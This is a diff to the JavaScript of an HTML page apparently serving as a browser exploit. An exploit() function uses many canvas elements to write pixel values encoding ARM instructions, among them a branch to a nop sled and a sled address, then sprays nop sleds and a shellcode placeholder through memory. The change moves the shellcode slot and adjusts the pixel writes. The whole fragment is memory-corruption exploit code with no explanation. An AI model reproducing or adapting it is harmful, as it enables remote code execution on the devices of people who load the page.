@@ -14,8 +14,6 @@
    </style>
    <script>
 
-      var shellcode = "{REPLACE_SHELLCODE_HERE}";
-
       function exploit() {
          var canvases = [];
          var N = 0x480;
@@ -60,9 +58,12 @@
          for (var i = 0; i <= N; i++) {
             canvases[i].width = canvases[i].width;
             c = canvases[i].getContext("2d");
+            // 0x2bc5120 -- address of nop sled
+            c.fillStyle = "rgba(32, 81, 188, 0.0079)";
+            c.fillRect(0, 0, 1, 1);
             // FE FF 13 EA -- b #0x500000 -- bootstrap: jumps to nop sled
             c.fillStyle = "rgba(254, 255, 19, 0.918)"
-            c.fillRect(0, 0, obj_size / 4, 1);
+            c.fillRect(1, 0, obj_size / 4 - 1, 1);
             arr[i] = c.getImageData(0, 0, obj_size / 4, 1).data[0];
          }
 
@@ -70,6 +71,8 @@
          while (nops.length < 0x1000) {
             nops += nops;
          }
+
+         var shellcode = "{REPLACE_SHELLCODE_HERE}";
 
          // spray nopsleds and shellcode
          var a = new Array();
